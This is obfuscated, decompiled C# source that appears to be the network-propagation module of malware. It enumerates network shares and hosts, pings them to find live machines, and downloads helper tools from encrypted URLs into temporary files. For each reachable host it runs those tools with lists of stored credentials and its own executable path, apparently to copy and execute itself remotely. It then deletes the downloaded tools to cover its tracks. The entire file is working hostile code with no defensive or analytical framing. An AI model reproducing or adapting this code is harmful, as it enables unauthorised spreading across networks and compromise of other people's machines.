using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace wawLLalyhHSFm;

internal sealed class vdyuMWvrJcM
{
	public enum kZwYwEMWDsvD
	{
		LboIcOBeIeJCn = 1,
		PmqtOoPklXL,
		rbjkhfARtThpHaw,
		dsQCBtDCQfzDYyJ,
		nzcmyyrYVLGFNRH
	}

	public enum aPJyievxEcXK
	{
		BRixiFIUbhMlSB,
		CfiSYezOUio,
		meRXcVknupEUdN,
		JcLxoVdsQWU
	}

	public enum ZuJJtWANzVEbPf
	{
		MfIFTzUcDvFyYol = 1,
		adQmUfCqVLr = 2,
		ApOgWLKtZjRC = 4,
		TdQZAPOQza = 8,
		pKMDQKmczno = 16,
		xaJpSGYniUkl = 19
	}

	public enum OnwKRjhGZDxQG
	{
		yqSQxYuBbLOIm,
		EnaUiewlVD,
		OXQyOsgyVDsouv,
		AFYtGEcrTkj,
		qMAUeSrtrjS,
		JtWtgTHwyqDW,
		QfMSEEXUSdSw,
		sSdGdNLJVbFtE,
		gIrECueEeuoYqRqj,
		LEHYQLBARFi,
		CsIGAtfrDRWB,
		LvRrIDcOLKssH
	}

	public sealed class BwZpMQgmQfMNqX : IEnumerable
	{
		private enum kUzOxDCHogA
		{
			VnwKhnxoxwZJo = 0,
			jERqzxRQjQfpwW = 259
		}

		[StructLayout(LayoutKind.Sequential)]
		private sealed class WRkVYfmMghiy
		{
			public kZwYwEMWDsvD YGLJIeOdbpPwZC;

			public aPJyievxEcXK IfgXhXlBLUQyBty;

			public OnwKRjhGZDxQG YDVAqxDIKa;

			public ZuJJtWANzVEbPf gQZFPWgzOPsU;

			public string lhfXYGVXTMLM;

			public string pWYCUJOLgBzBshf;

			public string yvcoOKEmXsH;

			public string kyUliYvlgPScAS;
		}

		private ArrayList TkCkBsfvkORCY = new ArrayList();

		[DllImport("Mpr.dll")]
		private static extern kUzOxDCHogA WNetOpenEnumA(kZwYwEMWDsvD dwScope, aPJyievxEcXK dwType, ZuJJtWANzVEbPf dwUsage, WRkVYfmMghiy p, out IntPtr lphEnum);

		[DllImport("Mpr.dll")]
		private static extern kUzOxDCHogA WNetCloseEnum(IntPtr intptr_0);

		[DllImport("Mpr.dll")]
		private static extern kUzOxDCHogA WNetEnumResourceA(IntPtr intptr_0, ref uint uint_0, IntPtr intptr_1, ref uint uint_1);

		private void EnumerateServers(WRkVYfmMghiy wrkVYfmMghiy_0, kZwYwEMWDsvD kZwYwEMWDsvD_0, aPJyievxEcXK aPJyievxEcXK_0, ZuJJtWANzVEbPf zuJJtWANzVEbPf_0, OnwKRjhGZDxQG onwKRjhGZDxQG_0)
		{
			uint uint_ = 16384u;
			IntPtr intPtr = Marshal.AllocHGlobal(16384);
			IntPtr lphEnum = IntPtr.Zero;
			uint uint_2 = 1u;
			if (WNetOpenEnumA(kZwYwEMWDsvD_0, aPJyievxEcXK_0, zuJJtWANzVEbPf_0, wrkVYfmMghiy_0, out lphEnum) == kUzOxDCHogA.VnwKhnxoxwZJo)
			{
				kUzOxDCHogA kUzOxDCHogA;
				do
				{
					kUzOxDCHogA = WNetEnumResourceA(lphEnum, ref uint_2, intPtr, ref uint_);
					switch (kUzOxDCHogA)
					{
					case kUzOxDCHogA.jERqzxRQjQfpwW:
						continue;
					case kUzOxDCHogA.VnwKhnxoxwZJo:
						Marshal.PtrToStructure(intPtr, wrkVYfmMghiy_0);
						if (wrkVYfmMghiy_0.YDVAqxDIKa == onwKRjhGZDxQG_0)
						{
							TkCkBsfvkORCY.Add(wrkVYfmMghiy_0.pWYCUJOLgBzBshf);
						}
						if ((wrkVYfmMghiy_0.gQZFPWgzOPsU & ZuJJtWANzVEbPf.adQmUfCqVLr) == ZuJJtWANzVEbPf.adQmUfCqVLr)
						{
							EnumerateServers(wrkVYfmMghiy_0, kZwYwEMWDsvD_0, aPJyievxEcXK_0, zuJJtWANzVEbPf_0, onwKRjhGZDxQG_0);
						}
						continue;
					}
					break;
				}
				while (kUzOxDCHogA != kUzOxDCHogA.jERqzxRQjQfpwW);
				WNetCloseEnum(lphEnum);
			}
			Marshal.FreeHGlobal(intPtr);
		}

		public BwZpMQgmQfMNqX(kZwYwEMWDsvD kZwYwEMWDsvD_0, aPJyievxEcXK aPJyievxEcXK_0, ZuJJtWANzVEbPf zuJJtWANzVEbPf_0, OnwKRjhGZDxQG onwKRjhGZDxQG_0)
		{
			WRkVYfmMghiy wrkVYfmMghiy_ = new WRkVYfmMghiy();
			EnumerateServers(wrkVYfmMghiy_, kZwYwEMWDsvD_0, aPJyievxEcXK_0, zuJJtWANzVEbPf_0, onwKRjhGZDxQG_0);
		}

		public IEnumerator GetEnumerator()
		{
			return TkCkBsfvkORCY.GetEnumerator();
		}
	}

	private sealed class sRDVhUqGWDMK
	{
		public string qEgFRwBEuViT;

		public string nnZbTqDLHVubvDs;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CRun_003Eb__d(string string_0)
		{
			if ((!string_0.StartsWith(getString_0(107386489)) && !string_0.StartsWith(getString_0(107386484)) && !string_0.StartsWith(getString_0(107386507)) && !string_0.Contains(getString_0(107386507))) || !naNRsxJGxBow(string_0))
			{
				return;
			}
			if (ufSaqXYLSvVxK.CiDFpEFgxOlMKoBn == getString_0(107396862))
			{
				for (int i = 0; i < xwPZfqGvdEcr.Count; i++)
				{
					if (ufSaqXYLSvVxK.CpQVYQNkDhJp)
					{
						if (File.Exists(qEgFRwBEuViT))
						{
							ufSaqXYLSvVxK.rNfIJaiTMyCx(qEgFRwBEuViT, getString_0(107388707) + string_0 + getString_0(107401594) + xwPZfqGvdEcr[i] + getString_0(107401585) + mIgcmWNBnTDx[i] + getString_0(107401608) + Assembly.GetEntryAssembly()!.Location + getString_0(107388661));
						}
					}
					else if (File.Exists(nnZbTqDLHVubvDs))
					{
						ufSaqXYLSvVxK.rNfIJaiTMyCx(nnZbTqDLHVubvDs, getString_0(107388707) + string_0 + getString_0(107401594) + xwPZfqGvdEcr[i] + getString_0(107401585) + mIgcmWNBnTDx[i] + getString_0(107401575) + Assembly.GetEntryAssembly()!.Location + getString_0(107388661));
					}
				}
			}
			else if (ufSaqXYLSvVxK.CpQVYQNkDhJp)
			{
				if (File.Exists(qEgFRwBEuViT))
				{
					ufSaqXYLSvVxK.rNfIJaiTMyCx(qEgFRwBEuViT, getString_0(107388707) + string_0 + getString_0(107401518) + Assembly.GetEntryAssembly()!.Location + getString_0(107388661));
				}
			}
			else if (File.Exists(nnZbTqDLHVubvDs))
			{
				ufSaqXYLSvVxK.rNfIJaiTMyCx(nnZbTqDLHVubvDs, getString_0(107388707) + string_0 + getString_0(107401485) + Assembly.GetEntryAssembly()!.Location + getString_0(107388661));
			}
		}

		static sRDVhUqGWDMK()
		{
			Strings.CreateGetStringDelegate(typeof(sRDVhUqGWDMK));
		}
	}

	public static List<string> SCdJnqTzIZ;

	public static string kSsljEeEwPPAmQ;

	public static List<string> xwPZfqGvdEcr;

	public static List<string> mIgcmWNBnTDx;

	public static List<string> fNbtdTljoaVpoK;

	public List<string> rccDtoPobHyU = new List<string>();

	public List<string> mHeVlYKBud = new List<string>();

	public List<string> dwAezBeerEKTaoAQ = new List<string>();

	[NonSerialized]
	internal static GetString getString_0;

	public static void lJpdHahcKW()
	{
		sRDVhUqGWDMK CS_0024_003C_003E8__locals0 = new sRDVhUqGWDMK();
		ufSaqXYLSvVxK.nFBQOHQpvKk();
		List<bwkStIDKDeY> list = bwkStIDKDeY.TQTcsohCeyCATQ();
		foreach (bwkStIDKDeY item in list)
		{
			SCdJnqTzIZ.Add(item.IPAddress);
		}
		if (ufSaqXYLSvVxK.EkwCuNFaGq.Count > 0)
		{
			SCdJnqTzIZ = SCdJnqTzIZ.Union(ufSaqXYLSvVxK.EkwCuNFaGq).ToList();
		}
		CS_0024_003C_003E8__locals0.qEgFRwBEuViT = getString_0(107390395);
		CS_0024_003C_003E8__locals0.nnZbTqDLHVubvDs = getString_0(107390395);
		try
		{
			CS_0024_003C_003E8__locals0.qEgFRwBEuViT = lFJsjrAitWYbuz();
		}
		catch
		{
		}
		try
		{
			CS_0024_003C_003E8__locals0.nnZbTqDLHVubvDs = VcBHVteoAshyqlfi();
		}
		catch
		{
		}
		foreach (bwkStIDKDeY item2 in list)
		{
			try
			{
				if (item2.IPAddress.StartsWith(getString_0(107386443)) || item2.IPAddress.StartsWith(getString_0(107386438)) || item2.IPAddress.StartsWith(getString_0(107386461)) || item2.IPAddress.Contains(getString_0(107386461)))
				{
					MAXkbIOxqP.hJRCqNVkjwc(item2.MacAddress, item2.IPAddress, getString_0(107402358));
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(SCdJnqTzIZ, delegate(string string_0)
			{
				if ((string_0.StartsWith(sRDVhUqGWDMK.getString_0(107386489)) || string_0.StartsWith(sRDVhUqGWDMK.getString_0(107386484)) || string_0.StartsWith(sRDVhUqGWDMK.getString_0(107386507)) || string_0.Contains(sRDVhUqGWDMK.getString_0(107386507))) && naNRsxJGxBow(string_0))
				{
					if (ufSaqXYLSvVxK.CiDFpEFgxOlMKoBn == sRDVhUqGWDMK.getString_0(107396862))
					{
						for (int i = 0; i < xwPZfqGvdEcr.Count; i++)
						{
							if (ufSaqXYLSvVxK.CpQVYQNkDhJp)
							{
								if (File.Exists(CS_0024_003C_003E8__locals0.qEgFRwBEuViT))
								{
									ufSaqXYLSvVxK.rNfIJaiTMyCx(CS_0024_003C_003E8__locals0.qEgFRwBEuViT, sRDVhUqGWDMK.getString_0(107388707) + string_0 + sRDVhUqGWDMK.getString_0(107401594) + xwPZfqGvdEcr[i] + sRDVhUqGWDMK.getString_0(107401585) + mIgcmWNBnTDx[i] + sRDVhUqGWDMK.getString_0(107401608) + Assembly.GetEntryAssembly()!.Location + sRDVhUqGWDMK.getString_0(107388661));
								}
							}
							else if (File.Exists(CS_0024_003C_003E8__locals0.nnZbTqDLHVubvDs))
							{
								ufSaqXYLSvVxK.rNfIJaiTMyCx(CS_0024_003C_003E8__locals0.nnZbTqDLHVubvDs, sRDVhUqGWDMK.getString_0(107388707) + string_0 + sRDVhUqGWDMK.getString_0(107401594) + xwPZfqGvdEcr[i] + sRDVhUqGWDMK.getString_0(107401585) + mIgcmWNBnTDx[i] + sRDVhUqGWDMK.getString_0(107401575) + Assembly.GetEntryAssembly()!.Location + sRDVhUqGWDMK.getString_0(107388661));
							}
						}
					}
					else if (ufSaqXYLSvVxK.CpQVYQNkDhJp)
					{
						if (File.Exists(CS_0024_003C_003E8__locals0.qEgFRwBEuViT))
						{
							ufSaqXYLSvVxK.rNfIJaiTMyCx(CS_0024_003C_003E8__locals0.qEgFRwBEuViT, sRDVhUqGWDMK.getString_0(107388707) + string_0 + sRDVhUqGWDMK.getString_0(107401518) + Assembly.GetEntryAssembly()!.Location + sRDVhUqGWDMK.getString_0(107388661));
						}
					}
					else if (File.Exists(CS_0024_003C_003E8__locals0.nnZbTqDLHVubvDs))
					{
						ufSaqXYLSvVxK.rNfIJaiTMyCx(CS_0024_003C_003E8__locals0.nnZbTqDLHVubvDs, sRDVhUqGWDMK.getString_0(107388707) + string_0 + sRDVhUqGWDMK.getString_0(107401485) + Assembly.GetEntryAssembly()!.Location + sRDVhUqGWDMK.getString_0(107388661));
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.qEgFRwBEuViT))
			{
				File.Delete(CS_0024_003C_003E8__locals0.qEgFRwBEuViT);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.nnZbTqDLHVubvDs))
			{
				File.Delete(CS_0024_003C_003E8__locals0.nnZbTqDLHVubvDs);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string lFJsjrAitWYbuz()
	{
		if (IntPtr.Size == 8)
		{
			return TzIOiZwMjOm(new Uri(ufSaqXYLSvVxK.hcAHXMuOvto(getString_0(107402305))));
		}
		return TzIOiZwMjOm(new Uri(ufSaqXYLSvVxK.hcAHXMuOvto(getString_0(107402305))));
	}

	public static string VcBHVteoAshyqlfi()
	{
		if (IntPtr.Size == 8)
		{
			return TzIOiZwMjOm(new Uri(ufSaqXYLSvVxK.hcAHXMuOvto(getString_0(107402224))));
		}
		return TzIOiZwMjOm(new Uri(ufSaqXYLSvVxK.hcAHXMuOvto(getString_0(107402147))));
	}

	public static bool naNRsxJGxBow(string string_0)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(string_0);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string TzIOiZwMjOm(Uri uri_0)
	{
		string path = Path.GetRandomFileName().Replace(getString_0(107401594), getString_0(107390395)).Remove(0, 3) + getString_0(107401589);
		WebClient webClient = new WebClient();
		webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	static vdyuMWvrJcM()
	{
		Strings.CreateGetStringDelegate(typeof(vdyuMWvrJcM));
		SCdJnqTzIZ = new List<string>();
		kSsljEeEwPPAmQ = getString_0(107390395);
		xwPZfqGvdEcr = new List<string>();
		mIgcmWNBnTDx = new List<string>();
		fNbtdTljoaVpoK = new List<string>();
	}
}
